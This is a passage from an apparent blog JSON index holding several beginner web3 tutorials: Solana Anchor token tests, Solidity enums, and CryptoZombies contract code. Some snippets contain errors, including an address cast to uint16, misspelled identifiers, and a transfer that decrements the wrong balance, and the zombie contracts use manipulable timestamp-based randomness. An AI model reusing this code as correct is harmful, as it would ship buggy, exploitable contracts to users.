how we wrote the from implementation block for ProxyTransfer, we can write the from implementation blocks for ProxyMintTo, ProxyBurn and ProxySetAuthority in a very similar fashion. A good exercise for you would be to write all these implementations yourselves. . After your best attempt, match your code with the one that is provided below: . For ProxyMintTo . impl&lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxyMintTo&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, MintTo&lt;&#39;info&gt;&gt; { fn from(accounts: &amp;mut ProxyMintTo&lt;&#39;info&gt;) -&gt; CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, MintTo&lt;&#39;info&gt;&gt; { let cpi_accounts = MintTo { mint: accounts.mint.clone(), to: accounts.to.clone(), authority: accounts.authority.clone(), }; let cpi_program = accounts.token_program.clone(); CpiContext::new(cpi_program, cpi_accounts) } } . For ProxyBurn . impl&lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxyBurn&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, Burn&lt;&#39;info&gt;&gt; { fn from(accounts: &amp;mut ProxyBurn&lt;&#39;info&gt;) -&gt; CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, Burn&lt;&#39;info&gt;&gt; { let cpi_accounts = Burn { mint: accounts.mint.clone(), to: accounts.to.clone(), authority: accounts.authority.clone(), }; let cpi_program = accounts.token_program.clone(); CpiContext::new(cpi_program, cpi_accounts) } } . For ProxySetAuthority . impl&lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxySetAuthority&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, SetAuthority&lt;&#39;info&gt;&gt; { fn from( accounts: &amp;mut ProxySetAuthority&lt;&#39;info&gt;, ) -&gt; CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, SetAuthority&lt;&#39;info&gt;&gt; { let cpi_accounts = SetAuthority { account_or_mint: accounts.account_or_mint.clone(), current_authority: accounts.current_authority.clone(), }; let cpi_program = accounts.token_program.clone(); CpiContext::new(cpi_program, cpi_accounts) } } . Hope that you fared well with writing your own implementations. Now, all the proxy functions that we wrote earlier are ready to work perfectly, except for one fine detail. Since, the implementations are more or less identical we can move onto the next quest, where we figure out the one final piece of this token-program puzzle before it becomes complete. . Now your screen should look something like: . The last implementation block . Remember the quest where we talked about enums and AccountSerialize and AccountDeserialize? Well, you might be wondering all is good with enums being used to refer to different states with convenient names, but where exactly did we define the states? You are correct, we did not define the states and in this quest we will be doing exactly the same. We will be assigning meaning to the names within enums using the concept of impl for blocks. . Write the below piece of code to implement the enum that we defined before defining the different account structs. The below skeleton would be later on filled to match the enum with corresponding meaningful values. . impl From&lt;AuthorityType&gt; for spl_token::instruction::AuthorityType { fn from(authority_ty: AuthorityType) -&gt; spl_token::instruction::AuthorityType { } } . This skeleton of the impl block is almost the same as previous blocks apart from the difference of from vs for. right? Good. Now the implementation going inside the block would be different since we are assiging values to a constant (enum) and not converting anything into anything. Update the above block with the following code: . impl From&lt;AuthorityType&gt; for spl_token::instruction::AuthorityType { fn from(authority_ty: AuthorityType) -&gt; spl_token::instruction::AuthorityType { match authority_ty { AuthorityType::MintTokens =&gt; spl_token::instruction::AuthorityType::MintTokens, AuthorityType::FreezeAccount =&gt; spl_token::instruction::AuthorityType::FreezeAccount, AuthorityType::AccountOwner =&gt; spl_token::instruction::AuthorityType::AccountOwner, AuthorityType::CloseAccount =&gt; spl_token::instruction::AuthorityType::CloseAccount, } } } . The match keyword is used in Rust and can be thought of as a sophisticated series of if-else block. Rust provides pattern matching via the match keyword, which can be used like a C switch. The first matching arm is evaluated and all possible values must be covered. . With this, your coding part for the Anchor program to create your own crypto-currency comes to an end with your screen looking something like: . . Checking our code . Before writing the tests to interact with our Anchor program, we can make sure that there are no errors in our code, by running the following command: . anchor build . If the code compiles without any error and gets built, that’s good news. Our Anchor program code is working fine and we can move ahead. If you are facing some errors, re-verify that you properly followed all instructions from all the quests. Also, if you are using a different version of anchor make sure that there no changes in the newer version for the code that we wrote, if there are revert to v0.17.0 or update your code accordingly. . Once your program is successfully built, you’ll get a screen similar to this: . . Importing the necessary code required for testing our contract . To begin testing, head over to tests/messengerapp.js and delete everything that’s written there. We are going to be writing our tests from scratch. The first step would be to import the necessary libraries and constants. To do that, use the following code: . const anchor = require(&quot;@project-serum/anchor&quot;); const assert = require(&quot;assert&quot;); . Now, since we will be using Mocha for testing our programs, we will create the skeleton of where we will be putting our tests. So, basically, how Mocha works is that it takes describe blocks as testing blocks and within those describe blocks there are numerous tests written using the it blocks. So, use the following code to create the skeleton: . describe(&#39;mymoneydapp&#39;, () =&gt; { const provider = anchor.Provider.local(); anchor.setProvider(provider); const program = anchor.workspace.Mymoneydapp; let mint = null; let from = null; let to = null; it(&quot;Initializes test state&quot;, async () =&gt; { }); it(&quot;Mints a token&quot;, async () =&gt; { }); it(&quot;Transfers a token&quot;, async () =&gt; { }); it(&quot;Burns a token&quot;, async () =&gt; { }); it(&quot;Set new mint authority&quot;, async () =&gt; { }); }); . Now, your screen should look something similar to: . The additional things that we coded there were the introduction of provider. The provider is the abstraction of a connection to the Solana network. In the test, the Anchor framework will create the provider for us based on the environment (anchor.Provider.local()). . Now, the program is an abstraction that combines the Provider, idl, and the programID (which is generated when the program is built) and allows us to call RPC methods against our program. . Apart from that we have initialized three variables, namely mint, from and to which we will use throughout our testing. . When we have the above things, we can start calling functions in our program, which is what we will be doing in our next sub-quest. . The SPL Token testing boilerplate . Ideally, while testing this contract, we should have been able to simply use @solana/web3.js to interact with our Anchor program, but it so happens that Anchor is built off a lot of components from Serum and is thus dependent on Serum. What that also means is that, we cannot simply import and use @solana/web3.js until @project-serum/serum uses the same version of @solana/web3.js as anchor. . So, to mimick the functions from @solana/web3.js, simply copy and paste the following code. Consider this code as the SPL token client boilerplate for test initialization. Paste this code right below the describe block we wrote in the last sub-quest. . const serumCmn = require(&quot;@project-serum/common&quot;); const TokenInstructions = require(&quot;@project-serum/serum&quot;).TokenInstructions; const TOKEN_PROGRAM_ID = new anchor.web3.PublicKey( TokenInstructions.TOKEN_PROGRAM_ID.toString() ); async function getTokenAccount(provider, addr) { return await serumCmn.getTokenAccount(provider, addr); } async function getMintInfo(provider, mintAddr) { return await serumCmn.getMintInfo(provider, mintAddr); } async function createMint(provider, authority) { if (authority === undefined) { authority = provider.wallet.publicKey; } const mint = anchor.web3.Keypair.generate(); const instructions = await createMintInstructions( provider, authority, mint.publicKey ); const tx = new anchor.web3.Transaction(); tx.add(...instructions); await provider.send(tx, [mint]); return mint.publicKey; } async function createMintInstructions(provider, authority, mint) { let instructions = [ anchor.web3.SystemProgram.createAccount({ fromPubkey: provider.wallet.publicKey, newAccountPubkey: mint, space: 82, lamports: await provider.connection.getMinimumBalanceForRentExemption(82), programId: TOKEN_PROGRAM_ID, }), TokenInstructions.initializeMint({ mint, decimals: 0, mintAuthority: authority, }), ]; return instructions; } async function createTokenAccount(provider, mint, owner) { const vault = anchor.web3.Keypair.generate(); const tx = new anchor.web3.Transaction(); tx.add( ...(await createTokenAccountInstrs(provider, vault.publicKey, mint, owner)) ); await provider.send(tx, [vault]); return vault.publicKey; } async function createTokenAccountInstrs( provider, newAccountPubkey, mint, owner, lamports ) { if (lamports === undefined) { lamports = await provider.connection.getMinimumBalanceForRentExemption(165); } return [ anchor.web3.SystemProgram.createAccount({ fromPubkey: provider.wallet.publicKey, newAccountPubkey, space: 165, lamports, programId: TOKEN_PROGRAM_ID, }), TokenInstructions.initializeAccount({ account: newAccountPubkey, mint, owner, }), ]; } . With this, your code screen should look something like: . Before moving onto the next quest, notice that we are using two new packages in the above code. You can download them using the following command: . npm install @project-serum/common @project-serum/serum . Successfull installation shall lead to this kind of screen: . . Initializing the test state . Let us fill in the first it block which isn’t exactly testing anything, but is essential as it is setting the state of mint, the from account and the to account that will be used throughout all the tests. Let’s see how we can set the states in the first it block. Update the first it block of code as follows: . it(&quot;Initializes test state&quot;, async () =&gt; { mint = await createMint(provider); from = await createTokenAccount(provider, mint, provider.wallet.publicKey); to = await createTokenAccount(provider, mint, provider.wallet.publicKey); }); . With this, your code screen should look something like this: . . All the functions used during the initialization have self-explanatory names, however if you want more depth of understanding and more clarity go through the boilerplate code that we copy pasted in the last quest. . Writing the test to check minting of our token . The method to call the functions of our program is pretty straight-forward. We will use the program RPCs (Remote procedure calls) to access the function. The method to do that is call functions using the format: program.rpc.proxyMintTo where proxyMintTo can be any of the functions that we have in the porgram (Solana contract) that we are calling. Let’s now write the test to mint a token. Write the below code to update the Mints a token it block. . it(&quot;Mints a token&quot;, async () =&gt; { await program.rpc.proxyMintTo(new anchor.BN(1000), { accounts: { authority: provider.wallet.publicKey, mint, to: from, tokenProgram: TokenInstructions.TOKEN_PROGRAM_ID, }, }); const fromAccount = await getTokenAccount(provider, from); assert.ok(fromAccount.amount.eq(new anchor.BN(1000))); }); . What’s happening in the test is pretty straight-forward. We first call the proxyMintTo function from our program (remember, the function names get converted to camel case from snake case when interacting through JS here) with amount being 1000, where BN stands for BigNumber and the list of accounts that we specified in the context of this function. Then, once the function has executed, we grab the tokenAccount from using the getTokenAccount function and then check it’s balance which should be equal to the number of tokens we just minted and sent to the from address. . After this, your code screen should look something like this: . Test to transfer and burn our tokens . Now in this quest, let’s test if we can correctly transfer our tokens and also if we can burn some of our supply or not. Let’s directly jump into the code to transfer a token. Write the code below to update the Transfers a token it block: . it(&quot;Transfers a token&quot;, async () =&gt; { await program.rpc.proxyTransfer(new anchor.BN(400), { accounts: { authority: provider.wallet.publicKey, to, from, tokenProgram: TokenInstructions.TOKEN_PROGRAM_ID, }, }); const fromAccount = await getTokenAccount(provider, from); const toAccount = await getTokenAccount(provider, to); assert.ok(fromAccount.amount.eq(new anchor.BN(600))); assert.ok(toAccount.amount.eq(new anchor.BN(400))); }); . As discussed earlier, we use the rpc handlers to call the proxy_transfer function with the required list of accounts and 400 as the amount from the from account to the to account. Since we minted 1000 tokens, after this transfer, the from account should have 600 (1000 - 400) tokens and the to account should have 400 tokens with them. This is exactly what we check in the test after the execution of the proxy_transfer function by grabbing both the accounts and then checking their balances. . Now, similarly to test whether we can burn our tokens or not, write the code below and update the Burns a token it block. . it(&quot;Burns a token&quot;, async () =&gt; { await program.rpc.proxyBurn(new anchor.BN(350), { accounts: { authority: provider.wallet.publicKey, mint, to, tokenProgram: TokenInstructions.TOKEN_PROGRAM_ID, }, }); const toAccount = await getTokenAccount(provider, to); assert.ok(toAccount.amount.eq(new anchor.BN(50))); }); . As discussed earlier, we use the rpc handlers to call the proxy_transfer function with the required list of accounts and 350 as the amount from the to account. Since the to account received 400 tokens in just the last test, if we burn 350 tokens then that account should be left with 50 tokens which is exactly what we are testing in this test. . After writing the above tests, you’ll have a code screen that looks something like: . . Testing the transfer of authority . In this quest, let’s test if we can correctly transfer the authority of our token to some other account correctly or not. Let’s directly jump into the code to transfer the ownership of our token. Write the code below to update the Setnew mint authority it block: . it(&quot;Set new mint authority&quot;, async () =&gt; { const newMintAuthority = anchor.web3.Keypair.generate(); await program.rpc.proxySetAuthority( { mintTokens: {} }, newMintAuthority.publicKey, { accounts: { accountOrMint: mint, currentAuthority: provider.wallet.publicKey, tokenProgram: TokenInstructions.TOKEN_PROGRAM_ID, }, } ); const mintInfo = await getMintInfo(provider, mint); assert.ok(mintInfo.mintAuthority.equals(newMintAuthority.publicKey)); }); . As discussed earlier, we use the rpc handlers to call the proxy_set_authority function with the required list of accounts, the new authority and the authority_type which is that of mintTokens. The address for the new mint authority is generated using the web3 function called Keypair.generate. Later after the execution of the function, we check the mint authority of our token and it should ideally check out to be the new addresss we just generated. . Running the tests . Now, that we are done running all the tests, make sure that your local validator is not running. That means make sure that the solana-test-validator process is not running and the network is set as localhost by inspecting the results of solana config get. Once all this is done, it is time for us to actually test the progarm that we wrote. To do that use the following command: . anchor test . If all the tests pass, you’ll get a screen similar to this: . . If you get some errors, try debugging those using the error messages you get. Make sure you have accurately followed the code presented in the quests. You are on the same Anchor version as that followed in the quest. With that you’ll find your way out of most of the errors that you might run into. . Congratulations on succesfully creating your own token and testing its functioning :D .",
            "url": "https://saxenism.com/solana/anchor/tutorial/web3/2021/11/24/Solana-Tutorial-Create-Tokens.html",
            "relUrl": "/solana/anchor/tutorial/web3/2021/11/24/Solana-Tutorial-Create-Tokens.html",
            "date": " • Nov 24, 2021"
        }
        
    
  
    
        ,"post18": {
            "title": "Enums",
            "content": "What are enums in Solidity? . enums or members of enumerated lists, in Solidity work much like enums in any other language. For me, it is basically a tool to reduce the stress on my mental RAM while writing code or smart contracts. . Typical Use Case: . Suppose you want to give your user an option to choose his favorite squad among 9 available options. The available options would be: . Black Bull | Silver Eagle | Blue Rose | Golden Dawn | Green Mantis | Crimson Lion | Aqua Deer | Purple Orca | Coral Peacock | . Suppose you intend to use the variable favSquad to denote your user’s favorite Black Clover squad and use that variable in subsequent logic. . One option (particularly messy one) would be to allow users to enter strings that denote their favorite squads, but that would bring forth a whole new hell of matching proper cases (upper cases and lower cases), also someone could enter a string that is out of scope, like Spade Kingdom for example. . Another option would be to assign numbers to each squad (0-8) based on their index, most probably like a mapping. That would work, but you’ll have to always remember which number represents which squad while coding, which would be pretty uncomfortable. . Hence, we pivot towards using enums. Enums restrict a variable to have one of only a few predefined values. The values in this enumerated list are called enums. With the use of enums it is possible to reduce the number of bugs in your code. This helps you to not make a mistake, to enter something out of the domain, while entering data and also improves the program readability. . For example, this is how we would use enums: . pragma solidity ^ 0.8.0; contract testEnums { enum CloverSquad { BlackBull, GoldenDawn, SilverEagle, BlueRose, CrimsonLion, GreenMantis, CoralPeacock, PurpleOrca, AquaDeer } CloverSquad favSquad; CloverSquad firstRankedSquad = CloverSquad.GoldenDawn; function getFirstRankedSquad() public view returns (CloverSquad) { return firstRandkedSquad; } } . Taking enum inputs and checking invalid inputs . A question that might arise in your minds (it did in mine too 😅) is how do we take enums as input from the user of our smart contract. We do this by typecasting the enums and checking if it is out of range or not. . Example: . // Yes, you can use your enums in mappings. mapping (address =&gt; CloverSquad) public playerSquad; function selectFavoriteSquad(uint userFavSquad) external { require(userFavSquad &lt;= uint(CloverSquads.AquaDeer), &quot;Choose from 0 to 8&quot;); playerSquad[msg.sender] = CloverSquad(userFavSquad); // Further Logic.... } . Further Reading . That is about everything that you will need to know about enums to be well on your way, but if you really want to get deeper into enums, I would suggest reading this incredibly detailed article on enums. . Thank you &amp; Godspeed. .",
            "url": "https://saxenism.com/web3/solidity/enums/beginner/2021/06/17/Enums-In-Solidity.html",
            "relUrl": "/web3/solidity/enums/beginner/2021/06/17/Enums-In-Solidity.html",
            "date": " • Jun 17, 2021"
        }
        
    
  
    
        ,"post19": {
            "title": "CryptoZombies - Lesson 5",
            "content": "Lesson 5: . Tokens on Ethereum: A token on Ethereum is basically just a smart contract that follows some common rules — namely it implements a standard set of functions that all other token contracts share. The token standard that’s a much better fit for crypto-collectibles like CryptoZombies — is called ERC721 tokens. ERC721 tokens are not interchangeable since each one is assumed to be unique, and are not divisible. You can only trade them in whole units, and each one has a unique ID. using a standard like ERC721 has the benefit that we don’t have to implement the auction or escrow logic within our contract that determines how players can trade / sell our zombies. If we conform to the spec, someone else could build an exchange platform for crypto-tradable ERC721 assets, and our ERC721 zombies would be usable on that platform. So there are clear benefits to using a token standard instead of rolling your own trading logic. . | The contract of ERC721 standard looks pretty much like an interface, waiting to be implemented: contract ERC721 { event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId); event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId); function balanceOf(address _owner) external view returns (uint256); function ownerOf(uint256 _tokenId) external view returns (address); function transferFrom(address _from, address _to, uint256 _tokenId) external payable; function approve(address _approved, uint256 _tokenId) external payable; } . | In Solidity, we can inheirt from multiple contracts. . | To avoid overflows and underflows, we use the SafeMath library. A library is a special type of contract in Solidity. One of the things it is useful for is to attach functions to native data types. For example, with the SafeMath library, we’ll use the syntax using SafeMath for uint256. The SafeMath library has 4 functions — add, sub, mul, and div. And now we can access these functions from uint256 as follows: using SafeMath for uint256; uint256 a = 5; uint256 b = a.add(3); // 5 + 3 = 8 uint256 c = a.mul(2); // 5 * 2 = 10 . | assert is similar to require, where it will throw an error if false. The difference between assert and require is that require will refund the user the rest of their gas when a function fails, whereas assert will not. So most of the time you want to use require in your code; assert is typically used when something has gone horribly wrong with the code (like a uint overflow). . | The standard in the Solidity community is to use a format called natspec. | Also, thanks for Loom Network for bringing such awesome animations to us :D . . Solidity code from Lesson 5: . erc721.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; contract ERC721 { event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId); event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId); function balanceOf(address _owner) external view returns (uint256); function ownerOf(uint256 _tokenId) external view returns (address); function transferFrom(address _from, address _to, uint256 _tokenId) external payable; function approve(address _approved, uint256 _tokenId) external payable; } . safemath.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; /** * @title SafeMath * @dev Math operations with safety checks that throw on error */ library SafeMath { /** * @dev Multiplies two numbers, throws on overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } /** * @dev Integer division of two numbers, truncating the quotient. */ function div(uint256 a, uint256 b) internal pure returns (uint256) { // assert(b &gt; 0); // Solidity automatically throws when dividing by 0 uint256 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold return c; } /** * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend). */ function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b &lt;= a); return a - b; } /** * @dev Adds two numbers, throws on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c &gt;= a); return c; } } /** * @title SafeMath32 * @dev SafeMath library implemented for uint32 */ library SafeMath32 { function mul(uint32 a, uint32 b) internal pure returns (uint32) { if (a == 0) { return 0; } uint32 c = a * b; assert(c / a == b); return c; } function div(uint32 a, uint32 b) internal pure returns (uint32) { // assert(b &gt; 0); // Solidity automatically throws when dividing by 0 uint32 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold return c; } function sub(uint32 a, uint32 b) internal pure returns (uint32) { assert(b &lt;= a); return a - b; } function add(uint32 a, uint32 b) internal pure returns (uint32) { uint32 c = a + b; assert(c &gt;= a); return c; } } /** * @title SafeMath16 * @dev SafeMath library implemented for uint16 */ library SafeMath16 { function mul(uint16 a, uint16 b) internal pure returns (uint16) { if (a == 0) { return 0; } uint16 c = a * b; assert(c / a == b); return c; } function div(uint16 a, uint16 b) internal pure returns (uint16) { // assert(b &gt; 0); // Solidity automatically throws when dividing by 0 uint16 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold return c; } function sub(uint16 a, uint16 b) internal pure returns (uint16) { assert(b &lt;= a); return a - b; } function add(uint16 a, uint16 b) internal pure returns (uint16) { uint16 c = a + b; assert(c &gt;= a); return c; } } . zombieownership.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombieattack.sol&quot;; import &quot;./erc721.sol&quot;; import &quot;./safemath.sol&quot;; contract ZombieOwnership is ZombieAttack, ERC721 { using SafeMath for uint256; mapping (uint =&gt; address) zombieApprovals; function balanceOf(address _owner) external view returns (uint256) { return ownerZombieCount[_owner]; } function ownerOf(uint256 _tokenId) external view returns (address) { return zombieToOwner[_tokenId]; } function _transfer(address _from, address _to, uint256 _tokenId) private { ownerZombieCount[_to] = ownerZombieCount[_to].add(1); ownerZombieCount[msg.sender] = ownerZombieCount[msg.sender].sub(1); zombieToOwner[_tokenId] = _to; emit Transfer(_from, _to, _tokenId); } function transferFrom(address _from, address _to, uint256 _tokenId) external payable { require (zombieToOwner[_tokenId] == msg.sender || zombieApprovals[_tokenId] == msg.sender); _transfer(_from, _to, _tokenId); } function approve(address _approved, uint256 _tokenId) external payable onlyOwnerOf(_tokenId) { zombieApprovals[_tokenId] = _approved; emit Approval(msg.sender, _approved, _tokenId); } } . zombieattack.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombiehelper.sol&quot;; contract ZombieAttack is ZombieHelper { uint randNonce = 0; uint attackVictoryProbability = 70; function randMod(uint _modulus) internal returns(uint) { randNonce = randNonce.add(1); return uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % _modulus; } function attack(uint _zombieId, uint _targetId) external onlyOwnerOf(_zombieId) { Zombie storage myZombie = zombies[_zombieId]; Zombie storage enemyZombie = zombies[_targetId]; uint rand = randMod(100); if (rand &lt;= attackVictoryProbability) { myZombie.winCount = myZombie.winCount.add(1); myZombie.level = myZombie.level.add(1); enemyZombie.lossCount = enemyZombie.lossCount.add(1); feedAndMultiply(_zombieId, enemyZombie.dna, &quot;zombie&quot;); } else { myZombie.lossCount = myZombie.lossCount.add(1); enemyZombie.winCount = enemyZombie.winCount.add(1); _triggerCooldown(myZombie); } } } . zombiefactory.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./ownable.sol&quot;; import &quot;./safemath.sol&quot;; contract ZombieFactory is Ownable { using SafeMath for uint256; using SafeMath32 for uint32; using SafeMath16 for uint16; event NewZombie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; uint cooldownTime = 1 days; struct Zombie { string name; uint dna; uint32 level; uint32 readyTime; uint16 winCount; uint16 lossCount; } Zombie[] public zombies; mapping (uint =&gt; address) public zombieToOwner; mapping (address =&gt; uint) ownerZombieCount; function _createZombie(string memory _name, uint _dna) internal { uint id = zombies.push(Zombie(_name, _dna, 1, uint32(now + cooldownTime), 0, 0)) - 1; zombieToOwner[id] = msg.sender; ownerZombieCount[msg.sender] = ownerZombieCount[msg.sender].add(1); emit NewZombie(id, _name, _dna); } function _generateRandomDna(string memory _str) private view returns (uint) { uint rand = uint(keccak256(abi.encodePacked(_str))); return rand % dnaModulus; } function createRandomZombie(string memory _name) public { require(ownerZombieCount[msg.sender] == 0); uint randDna = _generateRandomDna(_name); randDna = randDna - randDna % 100; _createZombie(_name, randDna); } } . zombiefeeding.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombiefactory.sol&quot;; contract KittyInterface { function getKitty(uint256 _id) external view returns ( bool isGestating, bool isReady, uint256 cooldownIndex, uint256 nextActionAt, uint256 siringWithId, uint256 birthTime, uint256 matronId, uint256 sireId, uint256 generation, uint256 genes ); } contract ZombieFeeding is ZombieFactory { KittyInterface kittyContract; modifier onlyOwnerOf(uint _zombieId) { require(msg.sender == zombieToOwner[_zombieId]); _; } function setKittyContractAddress(address _address) external onlyOwner { kittyContract = KittyInterface(_address); } function _triggerCooldown(Zombie storage _zombie) internal { _zombie.readyTime = uint32(now + cooldownTime); } function _isReady(Zombie storage _zombie) internal view returns (bool) { return (_zombie.readyTime &lt;= now); } function feedAndMultiply(uint _zombieId, uint _targetDna, string memory _species) internal onlyOwnerOf(_zombieId) { Zombie storage myZombie = zombies[_zombieId]; require(_isReady(myZombie)); _targetDna = _targetDna % dnaModulus; uint newDna = (myZombie.dna + _targetDna) / 2; if (keccak256(abi.encodePacked(_species)) == keccak256(abi.encodePacked(&quot;kitty&quot;))) { newDna = newDna - newDna % 100 + 99; } _createZombie(&quot;NoName&quot;, newDna); _triggerCooldown(myZombie); } function feedOnKitty(uint _zombieId, uint _kittyId) public { uint kittyDna; (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId); feedAndMultiply(_zombieId, kittyDna, &quot;kitty&quot;); } } . zombiehelper.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombiefeeding.sol&quot;; contract ZombieHelper is ZombieFeeding { uint levelUpFee = 0.001 ether; modifier aboveLevel(uint _level, uint _zombieId) { require(zombies[_zombieId].level &gt;= _level); _; } function withdraw() external onlyOwner { address _owner = owner(); _owner.transfer(address(this).balance); } function setLevelUpFee(uint _fee) external onlyOwner { levelUpFee = _fee; } function levelUp(uint _zombieId) external payable { require(msg.value == levelUpFee); zombies[_zombieId].level = zombies[_zombieId].level.add(1); } function changeName(uint _zombieId, string calldata _newName) external aboveLevel(2, _zombieId) onlyOwnerOf(_zombieId) { zombies[_zombieId].name = _newName; } function changeDna(uint _zombieId, uint _newDna) external aboveLevel(20, _zombieId) onlyOwnerOf(_zombieId) { zombies[_zombieId].dna = _newDna; } function getZombiesByOwner(address _owner) external view returns(uint[] memory) { uint[] memory result = new uint[](ownerZombieCount[_owner]); uint counter = 0; for (uint i = 0; i &lt; zombies.length; i++) { if (zombieToOwner[i] == _owner) { result[counter] = i; counter++; } } return result; } } .",
            "url": "https://saxenism.com/web3/solidity/cryptozombies/beginner/2021/06/16/CryptoZombies-Lesson-5.html",
            "relUrl": "/web3/solidity/cryptozombies/beginner/2021/06/16/CryptoZombies-Lesson-5.html",
            "date": " • Jun 16, 2021"
        }
        
    
  
    
        ,"post20": {
            "title": "CryptoZombies - Lesson 4",
            "content": "Lesson 4: . view tells us that by running the functions, no data will be saved/changed. pure tells us that not only does the function not save any data to the blockchain, but it also doens’t read any data from the blockchain. Both of these don’t cost any gas to call if they’re called from outside the contract, but the do cost gas if called internally by another function because the calling function is eventually making changes on the blockchain. | The function modifiers can all be stacked together on a function definition, as follows: function test() external view onlyOwner anotherModifier { // Some function-y stuff } . | The payable modifier: They are a special type of functions that can recieve Ether. In Ethereum, because both the money (Ether), the data (transaction payload), and the contract code itself all live on Ethereum, it’s possible for you to call a function and pay money to the contract at the same time. This allows us to have some really cool logic, such as: requiring a certain payment to the contract in order to execute a function. Here’s an example: contract OnlineStore { function buySomething () external payable { require(msg.value == 0.01 ether); //ether is an inbuilt uint; transferStuff(msg.sender); } } . msg.value is a way to see how much Ether was sent to the contract. If a function is not marked as payable, and you try to send Ether to it, the function will reject your transaction. . | The payment can only be done to a data type that’s called address payable. Example: function withdraw() external onlyOwner() { address payable _owner = address(uint16(owner())); _owner.transfer(address(this).balance); } address(this).balance will return the total balance stored on the contract. . | A make-shift way of generating random numbers in Solidity is as follows: // Generate a random number between 1 and 100: uint randNonce = 0; uint random = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % 100; randNonce++; uint random2 = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % 100; . But, this is unsafe, because technically, this can be hacked. How? Read on: In Ethereum, when you call a function on a contract, you broadcast it to a node or nodes on the network as a transaction. The nodes on the network then collect a bunch of transactions, try to be the first to solve a computationally-intensive mathematical problem as a “Proof of Work”, and then publish that group of transactions along with their Proof of Work (PoW) as a block to the rest of the network. Once a node has solved the PoW, the other nodes stop trying to solve the PoW, verify that the other node’s list of transactions are valid, and then accept the block and move on to trying to solve the next block. This makes our random number function exploitable. Let’s say we had a coin flip contract —heads you double your money, tails you lose everything. Let’s say it used the above random function to determine heads or tails. (random &gt;= 50 is heads, random &lt; 50 is tails). If I were running a node, I could publish a transaction only to my own node and not share it. I could then run the coin flip function to see if I won — and if I lost, choose not to include that transaction in the next block I’m solving. I could keep doing this indefinitely until I finally won the coin flip and solved the next block, and profit. . | One relatively safe method is to use an Oracle to access a random number from outside the Ethereum blockchain | . Solidity Code from Lesson 4 . zombieattack.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombiehelper.sol&quot;; contract ZombieAttack is ZombieHelper { uint randNonce = 0; uint attackVictoryProbability = 70; function randMod(uint _modulus) internal returns(uint) { randNonce++; return uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % _modulus; } function attack(uint _zombieId, uint _targetId) external ownerOf(_zombieId) { Zombie storage myZombie = zombies[_zombieId]; Zombie storage enemyZombie = zombies[_targetId]; uint rand = randMod(100); if (rand &lt;= attackVictoryProbability) { myZombie.winCount++; myZombie.level++; enemyZombie.lossCount++; feedAndMultiply(_zombieId, enemyZombie.dna, &quot;zombie&quot;); } else { myZombie.lossCount++; enemyZombie.winCount++; _triggerCooldown(myZombie); } } } . zombiehelper.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombiefeeding.sol&quot;; contract ZombieHelper is ZombieFeeding { uint levelUpFee = 0.001 ether; modifier aboveLevel(uint _level, uint _zombieId) { require(zombies[_zombieId].level &gt;= _level); _; } function withdraw() external onlyOwner { address _owner = owner(); _owner.transfer(address(this).balance); } function setLevelUpFee(uint _fee) external onlyOwner { levelUpFee = _fee; } function levelUp(uint _zombieId) external payable { require(msg.value == levelUpFee); zombies[_zombieId].level++; } function changeName(uint _zombieId, string calldata _newName) external aboveLevel(2, _zombieId) ownerOf(_zombieId) { zombies[_zombieId].name = _newName; } function changeDna(uint _zombieId, uint _newDna) external aboveLevel(20, _zombieId) ownerOf(_zombieId) { zombies[_zombieId].dna = _newDna; } function getZombiesByOwner(address _owner) external view returns(uint[] memory) { uint[] memory result = new uint[](ownerZombieCount[_owner]); uint counter = 0; for (uint i = 0; i &lt; zombies.length; i++) { if (zombieToOwner[i] == _owner) { result[counter] = i; counter++; } } return result; } } . zombiefactory.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./ownable.sol&quot;; contract ZombieFactory is Ownable { event NewZombie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; uint cooldownTime = 1 days; struct Zombie { string name; uint dna; uint32 level; uint32 readyTime; uint16 winCount; uint16 lossCount; } Zombie[] public zombies; mapping (uint =&gt; address) public zombieToOwner; mapping (address =&gt; uint) ownerZombieCount; function _createZombie(string memory _name, uint _dna) internal { uint id = 